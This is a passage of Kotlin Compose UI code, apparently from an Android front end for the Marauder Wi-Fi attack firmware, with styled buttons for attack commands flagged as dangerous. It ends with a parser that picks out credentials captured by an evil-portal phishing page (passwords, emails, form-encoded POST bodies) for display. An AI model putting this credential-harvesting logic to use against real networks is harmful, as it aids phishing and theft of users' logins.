            maxLines = 1, modifier = Modifier.weight(1f))
        Text("${ap.rssi}", color = Fox.muted, fontFamily = FoxMono, fontSize = 10.5.sp)
    }
}

@Composable
private fun ModeChip(text: String, selected: Boolean, modifier: Modifier = Modifier, onClick: () -> Unit) {
    Box(
        modifier.clip(RoundedCornerShape(10.dp))
            .background(if (selected) Fox.amberDim else Fox.surface2)
            .border(1.dp, if (selected) Fox.amber else Fox.line, RoundedCornerShape(10.dp))
            .clickable { onClick() }.padding(vertical = 10.dp),
        contentAlignment = Alignment.Center,
    ) { Text(text, color = if (selected) Fox.amber else Fox.fg, fontSize = 12.5.sp, fontWeight = FontWeight.SemiBold) }
}

@Composable
private fun CmdChip(cmd: Marauder.Cmd, onClick: () -> Unit) {
    val accent = cmd.danger
    Box(
        Modifier.clip(RoundedCornerShape(9.dp))
            .background(if (accent) Fox.crit.copy(alpha = 0.14f) else Fox.surface2)
            .border(1.dp, if (accent) Fox.crit else Fox.line, RoundedCornerShape(9.dp))
            .clickable { onClick() }.padding(vertical = 8.dp, horizontal = 11.dp),
    ) {
        Text(
            cmd.label + if (cmd.arg != Marauder.ArgKind.NONE) " …" else "",
            color = if (accent) Fox.crit else Fox.fg, fontSize = 12.sp, fontWeight = FontWeight.Medium,
        )
    }
}

@Composable
private fun MBtn(text: String, modifier: Modifier = Modifier, accent: Boolean = false, onClick: () -> Unit) {
    Box(
        modifier.clip(RoundedCornerShape(11.dp))
            .background(if (accent) Fox.amberDim else Fox.surface2)
            .border(1.dp, if (accent) Fox.amber else Fox.line, RoundedCornerShape(11.dp))
            .clickable { onClick() }.padding(vertical = 11.dp, horizontal = 12.dp),
        contentAlignment = Alignment.Center,
    ) { Text(text, color = if (accent) Fox.amber else Fox.fg, fontSize = 12.5.sp, fontWeight = FontWeight.SemiBold) }
}

/** A console line that looks like a captured evil-portal submission (creds), for the manager view. */
private fun portalCredLine(line: String): Boolean {
    val l = line.trim()
    if (l.isEmpty() || l.startsWith("›") || l.startsWith("[")) return false
    val lo = l.lowercase()
    // Marauder prints captured form fields; catch the usual credential-bearing shapes, plus the
    // generic URL-encoded POST body shape (key=val&key=val) a captive portal submits.
    val formEncoded = l.count { it == '=' } >= 2 && '&' in l
    val hit = ("password" in lo || "passwd" in lo || "email" in lo || "username" in lo ||
        "user=" in lo || "pass=" in lo || "credential" in lo ||
        (("@" in l) && ("=" in l)) || formEncoded)
    // avoid matching our own scan/attack chatter
    return hit && !lo.startsWith("received ") && !lo.startsWith("complete ") && !lo.startsWith("pwnd")
}
